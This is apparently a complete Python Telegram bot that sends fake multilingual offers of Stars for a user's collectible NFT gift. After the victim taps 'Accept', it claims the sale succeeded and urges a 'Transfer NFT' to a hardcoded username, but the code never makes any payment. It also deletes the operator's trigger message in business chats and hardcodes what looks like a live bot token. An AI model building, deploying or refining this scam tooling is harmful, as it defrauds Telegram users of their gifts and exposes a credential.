import asyncio
import html
import random
import re
from aiogram import Bot, Dispatcher, F, types
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.types import (
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    InlineQueryResultArticle,
    InputTextMessageContent,
    LinkPreviewOptions,
)

BOT_TOKEN = "8070456712:AAGwuG9kY3ITfkB2a0I7f6fUnqHNt25Gxzg"
BUYER_USERNAME = "mokqe"

bot = Bot(
    token=BOT_TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML)
)
dp = Dispatcher()

GIFT_CMD_PATTERN = re.compile(
    r"^/gift\s+(?:https?://)?t\.me/nft/([A-Za-z0-9_-]+)\s+(\d+)(?:\s*stars)?(?:\s+(ru|en|ch))?$",
    re.IGNORECASE
)

OF_GIFT_PATTERN = re.compile(
    r"^/of\s+gift\s+(\d+)$",
    re.IGNORECASE
)

GIFT_CODES: dict[str, dict] = {}
ACTIVE_OFFERS: dict[tuple[int, int], str] = {}

TEXTS = {
    "ru": {
        "offer": (
            "Пользователь <b>{sender}</b> предлагает Вам {stars} ⭐️ "
            'за коллекционный предмет <a href="{url}">{name}</a>\n\n'
            "Предложение действует еще 6 ч. 0 мин."
        ),
        "btn_decline": "ⓧ Отклонить",
        "btn_accept": "✓ Принять",
        "sold": (
            '🎁 <b>Подарок:</b> <a href="{url}">{name}</a> <b>успешно продан!</b>\n\n'
            "<b>Передайте подарок покупателю для зачисления {stars} ⭐️.</b>"
        ),
        "btn_transfer": "Передать NFT",
        "btn_how": "Как передать?",
        "warning": (
            "Внимание!\n\n"
            "Следуйте инструкциям, чтобы не потерять подарок и получить оплату.\n\n"
            "Нажмите ОК, если вы прочитали предупреждение."
        ),
        "how_to": (
            "Нажмите «Передать NFT» под сообщением.\n\n"
            "В открывшемся окне подтвердите передачу подарка."
        ),
        "declined_msg": 'ⓧ <b>Предложение за коллекционный предмет <a href="{url}">{name}</a> отклонено.</b>',
        "declined_toast": "Предложение отклонено",
    },
    "en": {
        "offer": (
            "User <b>{sender}</b> offers you {stars} ⭐️ "
            'for the collectible <a href="{url}">{name}</a>\n\n'
            "Offer valid for 6 h. 0 min."
        ),
        "btn_decline": "ⓧ Decline",
        "btn_accept": "✓ Accept",
        "sold": (
            '🎁 <b>Gift:</b> <a href="{url}">{name}</a> <b>successfully sold!</b>\n\n'
            "<b>Transfer the gift to the buyer to receive {stars} ⭐️.</b>"
        ),
        "btn_transfer": "Transfer NFT",
        "btn_how": "How to transfer?",
        "warning": (
            "Attention!\n\n"
            "Follow the instructions so you don't lose your gift and receive payment.\n\n"
            "Press OK if you have read the warning."
        ),
        "how_to": (
            "Tap «Transfer NFT» below the message.\n\n"
            "In the opened window, confirm the gift transfer."
        ),
        "declined_msg": 'ⓧ <b>The offer for collectible <a href="{url}">{name}</a> has been declined.</b>',
        "declined_toast": "Offer declined",
    },
    "ch": {
        "offer": (
            "用户 <b>{sender}</b> 出价 {stars} ⭐️ "
            '购买您的收藏品 <a href="{url}">{name}</a>\n\n'
            "报价有效期还剩 6 小时 0 分钟。"
        ),
        "btn_decline": "ⓧ 拒绝",
        "btn_accept": "✓ 接受",
        "sold": (
            '🎁 <b>礼物：</b><a href="{url}">{name}</a> <b>已成功售出！</b>\n\n'
            "<b>请将礼物转移给买家以获得 {stars} ⭐️ 入账。</b>"
        ),
        "btn_transfer": "转移 NFT",
        "btn_how": "如何转移？",
        "warning": (
            "注意！\n\n"
            "请按照说明操作，以免丢失礼物并顺利收到付款。\n\n"
            "如果您已阅读此警告，请点击“确定”。"
        ),
        "how_to": (
            "点击消息下方的“转移 NFT”。\n\n"
            "在打开的窗口中确认转移礼物。"
        ),
        "declined_msg": 'ⓧ <b>收藏品 <a href="{url}">{name}</a> 的报价已被拒绝。</b>',
        "declined_toast": "报价已拒绝",
    },
}


def get_user_display_name(user: types.User | None, fallback: str = "User") -> str:
    if not user:
        return fallback
    raw_name = user.full_name or user.first_name or user.username or fallback
    return html.escape(raw_name)


def format_nft_name(slug: str, with_space: bool = False) -> str:
    if "-" in slug:
        parts = slug.rsplit("-", 1)
        sep = " #" if with_space else "#"
        return f"{parts[0]}{sep}{parts[1]}"
    return slug


def generate_code() -> str:
    while True:
        code = str(random.randint(100000, 999999))
        if code not in GIFT_CODES:
            return code


def build_offer_keyboard(code: str, lang: str) -> InlineKeyboardMarkup:
    t = TEXTS.get(lang, TEXTS["en"])
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text=t["btn_decline"],
                    callback_data=f"decline:{code}"
                ),
                InlineKeyboardButton(
                    text=t["btn_accept"],
                    callback_data=f"accept:{code}",
                ),
            ]
        ]
    )


def build_sold_keyboard(lang: str) -> InlineKeyboardMarkup:
    t = TEXTS.get(lang, TEXTS["en"])
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text=t["btn_transfer"],
                    url=f"tg://send_gift?to={BUYER_USERNAME}"
                )
            ],
            [
                InlineKeyboardButton(
                    text=t["btn_how"],
                    callback_data=f"how:{lang}",
                    style="success"
                )
            ]
        ]
    )


# 1. Создание оффера в личке с ботом: /gift t.me/nft/MoodPack-119564 300 stars [ru|en|ch]
@dp.message(F.text.regexp(GIFT_CMD_PATTERN))
async def handle_create_gift_code(message: types.Message):
    match = GIFT_CMD_PATTERN.search(message.text.strip())
    if not match:
        return

    slug = match.group(1)
    stars_amount = match.group(2)
    lang = match.group(3).lower() if match.group(3) else "en"

    code = generate_code()
    display_name = format_nft_name(slug, with_space=False)
    nft_url = f"https://t.me/nft/{slug}"
    creator_name = get_user_display_name(message.from_user)

    GIFT_CODES[code] = {
        "slug": slug,
        "stars": stars_amount,
        "lang": lang,
        "creator_id": message.from_user.id if message.from_user else None,
        "creator_name": creator_name,
        "status_msg_id": None,
    }

    bot_info = await bot.get_me()
    sent = await message.answer(
        text=(
            f'✅ <b>Оффер создан:</b> <a href="{nft_url}">{display_name}</a> ({stars_amount} ⭐️ | {lang.upper()})\n'
            f"Инлайн: <code>@{bot_info.username} {code}</code>\n"
            f"Секретарь: <code>/of gift {code}</code>"
        ),
        link_preview_options=LinkPreviewOptions(
            url=nft_url,
            show_above_text=True,
        ),
    )
    GIFT_CODES[code]["status_msg_id"] = sent.message_id


# 2. Inline-режим: @бот 123456 или @бот /of gift 123456
@dp.inline_query()
async def handle_inline_offer(inline_query: types.InlineQuery):
    raw_query = inline_query.query.strip()
    digits_match = re.search(r"(\d{6})", raw_query)
    if not digits_match:
        await inline_query.answer([], cache_time=1, is_personal=True)
        return

    code = digits_match.group(1)
    data = GIFT_CODES.get(code)
    if not data:
        await inline_query.answer([], cache_time=1, is_personal=True)
        return

    slug = data["slug"]
    stars_amount = data["stars"]
    lang = data["lang"]
    display_name = format_nft_name(slug, with_space=False)
    nft_url = f"https://t.me/nft/{slug}"
    sender_name = get_user_display_name(inline_query.from_user, data.get("creator_name", "User"))

    # Сохраняем актуальное имя отправителя из инлайна
    data["creator_name"] = sender_name

    offer_text = TEXTS[lang]["offer"].format(
        sender=sender_name,
        stars=stars_amount,
        url=nft_url,
        name=display_name,
    )

    result = InlineQueryResultArticle(
        id=code,
        title=f"{display_name} — {stars_amount} ⭐️ ({lang.upper()})",
        description=f"Отправитель: {html.unescape(sender_name)}",
        input_message_content=InputTextMessageContent(
            message_text=offer_text,
            link_preview_options=LinkPreviewOptions(
                url=nft_url,
                show_above_text=True,
            ),
        ),
        reply_markup=build_offer_keyboard(code, lang),
    )

    await inline_query.answer([result], cache_time=1, is_personal=True)


@dp.chosen_inline_result()
async def on_chosen_inline(chosen: types.ChosenInlineResult):
    code = chosen.result_id
    data = GIFT_CODES.get(code)
    if not data:
        return

    owner_id = data.get("creator_id")
    owner_msg_id = data.get("status_msg_id")
    if owner_id and owner_msg_id:
        display_name = format_nft_name(data["slug"], with_space=False)
        nft_url = f"https://t.me/nft/{data['slug']}"
        try:
            await bot.edit_message_text(
                chat_id=owner_id,
                message_id=owner_msg_id,
                text=(
                    f'📤 <b>Оффер отправлен:</b> '
                    f'<a href="{nft_url}">{display_name}</a> ({data["stars"]} ⭐️)'
                ),
                link_preview_options=LinkPreviewOptions(
                    url=nft_url,
                    show_above_text=True,
                ),
            )
        except Exception:
            pass


# Поддержка /of gift (цифры) через секретаря и в личке (оставлена как резерв)
async def dispatch_offer_by_code(
    code: str,
    chat_id: int,
    sender_name: str,
    sender_id: int | None,
    recipient_name: str,
    business_connection_id: str | None = None,
):
    data = GIFT_CODES.get(code)
    if not data:
        return

    slug = data["slug"]
    stars_amount = data["stars"]
    lang = data["lang"]
    display_name = format_nft_name(slug, with_space=False)
    nft_url = f"https://t.me/nft/{slug}"
    actual_sender_name = sender_name or data.get("creator_name", "User")

    text = TEXTS[lang]["offer"].format(
        sender=actual_sender_name,
        stars=stars_amount,
        url=nft_url,
        name=display_name,
    )

    offer_msg = await bot.send_message(
        chat_id=chat_id,
        business_connection_id=business_connection_id,
        text=text,
        reply_markup=build_offer_keyboard(code, lang),
        link_preview_options=LinkPreviewOptions(
            url=nft_url,
            show_above_text=True,
        ),
    )

    ACTIVE_OFFERS[(chat_id, offer_msg.message_id)] = code

    owner_id = data.get("creator_id") or sender_id
    owner_msg_id = data.get("status_msg_id")
    if owner_id and owner_msg_id:
        try:
            await bot.edit_message_text(
                chat_id=owner_id,
                message_id=owner_msg_id,
                text=(
                    f'📤 <b>Оффер отправлен</b> ({recipient_name}): '
                    f'<a href="{nft_url}">{display_name}</a> ({stars_amount} ⭐️)'
                ),
                link_preview_options=LinkPreviewOptions(
                    url=nft_url,
                    show_above_text=True,
                ),
            )
        except Exception:
            pass


@dp.business_message(F.text.regexp(OF_GIFT_PATTERN))
async def handle_business_of_gift(message: types.Message):
    if message.from_user and message.from_user.id == message.chat.id:
        return

    match = OF_GIFT_PATTERN.search(message.text.strip())
    if not match:
        return

    code = match.group(1)

    if message.business_connection_id:
        try:
            await bot.delete_business_messages(
                business_connection_id=message.business_connection_id,
                message_ids=[message.message_id],
            )
        except Exception:
            pass

    sender_name = get_user_display_name(message.from_user)
    sender_id = message.from_user.id if message.from_user else None
    raw_recipient = message.chat.full_name or message.chat.first_name or message.chat.username or "User"
    recipient_name = html.escape(raw_recipient)

    await dispatch_offer_by_code(
        code=code,
        chat_id=message.chat.id,
        sender_name=sender_name,
        sender_id=sender_id,
        recipient_name=recipient_name,
        business_connection_id=message.business_connection_id,
    )


@dp.message(F.text.regexp(OF_GIFT_PATTERN))
async def handle_direct_of_gift(message: types.Message):
    match = OF_GIFT_PATTERN.search(message.text.strip())
    if not match:
        return

    code = match.group(1)
    sender_name = get_user_display_name(message.from_user)

    await dispatch_offer_by_code(
        code=code,
        chat_id=message.chat.id,
        sender_name=sender_name,
        sender_id=None,
        recipient_name="Test",
    )


# 3. Принятие оффера (работает и для inline, и для обычных сообщений)
@dp.callback_query(F.data.startswith("accept:"))
async def on_accept(callback: types.CallbackQuery):
    _, code = callback.data.split(":", 1)
    data = GIFT_CODES.get(code)
    if not data:
        await callback.answer()
        return

    # Отправитель не может принять свой же оффер (кроме теста в личке с самим ботом)
    is_direct_bot_test = callback.message and callback.message.chat.id == data.get("creator_id")
    if not is_direct_bot_test and data.get("creator_id") and callback.from_user.id == data["creator_id"]:
        await callback.answer()
        return

    lang = data["lang"]
    slug = data["slug"]
    stars_amount = data["stars"]
    t = TEXTS.get(lang, TEXTS["en"])
    display_name = format_nft_name(slug, with_space=True)
    nft_url = f"https://t.me/nft/{slug}"

    sold_text = t["sold"].format(
        url=nft_url,
        name=display_name,
        stars=stars_amount,
    )

    if callback.inline_message_id:
        await bot.edit_message_text(
            inline_message_id=callback.inline_message_id,
            text=sold_text,
            reply_markup=build_sold_keyboard(lang),
            link_preview_options=LinkPreviewOptions(
                url=nft_url,
                show_above_text=True,
            ),
        )
    elif callback.message:
        await callback.message.edit_text(
            text=sold_text,
            reply_markup=build_sold_keyboard(lang),
            link_preview_options=LinkPreviewOptions(
                url=nft_url,
                show_above_text=True,
            ),
        )

    owner_id = data.get("creator_id")
    owner_msg_id = data.get("status_msg_id")
    acceptor_name = get_user_display_name(callback.from_user)

    if owner_id and owner_msg_id:
        try:
            await bot.edit_message_text(
                chat_id=owner_id,
                message_id=owner_msg_id,
                text=(
                    f'✅ <b>Оффер принят</b> ({acceptor_name}): '
                    f'<a href="{nft_url}">{display_name}</a> ({stars_amount} ⭐️)'
                ),
                link_preview_options=LinkPreviewOptions(
                    url=nft_url,
                    show_above_text=True,
                ),
            )
        except Exception:
            pass

    await callback.answer(t["warning"], show_alert=True)


# 4. Отклонение оффера
@dp.callback_query(F.data.startswith("decline:"))
async def on_decline(callback: types.CallbackQuery):
    _, code = callback.data.split(":", 1)
    data = GIFT_CODES.get(code)
    if not data:
        await callback.answer()
        return

    is_direct_bot_test = callback.message and callback.message.chat.id == data.get("creator_id")
    if not is_direct_bot_test and data.get("creator_id") and callback.from_user.id == data["creator_id"]:
        await callback.answer()
        return

    lang = data["lang"]
    slug = data["slug"]
    t = TEXTS.get(lang, TEXTS["en"])
    display_name = format_nft_name(slug, with_space=False)
    nft_url = f"https://t.me/nft/{slug}"

    declined_text = t["declined_msg"].format(url=nft_url, name=display_name)

    if callback.inline_message_id:
        await bot.edit_message_text(
            inline_message_id=callback.inline_message_id,
            text=declined_text,
            link_preview_options=LinkPreviewOptions(
                url=nft_url,
                show_above_text=True,
            ),
        )
    elif callback.message:
        await callback.message.edit_text(
            text=declined_text,
            link_preview_options=LinkPreviewOptions(
                url=nft_url,
                show_above_text=True,
            ),
        )

    owner_id = data.get("creator_id")
    owner_msg_id = data.get("status_msg_id")
    decliner_name = get_user_display_name(callback.from_user)

    if owner_id and owner_msg_id:
        try:
            await bot.edit_message_text(
                chat_id=owner_id,
                message_id=owner_msg_id,
                text=(
                    f'❌ <b>Оффер отклонён</b> ({decliner_name}): '
                    f'<a href="{nft_url}">{display_name}</a>'
                ),
                link_preview_options=LinkPreviewOptions(
                    url=nft_url,
                    show_above_text=True,
                ),
            )
        except Exception:
            pass

    await callback.answer(t["declined_toast"], show_alert=False)


# 5. Инструкция по передаче (всплывающее окно)
@dp.callback_query(F.data.startswith("how:"))
async def on_how_to_transfer(callback: types.CallbackQuery):
    _, lang = callback.data.split(":", 1)
    t = TEXTS.get(lang, TEXTS["en"])
    await callback.answer(t["how_to"], show_alert=True)


async def main():
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())

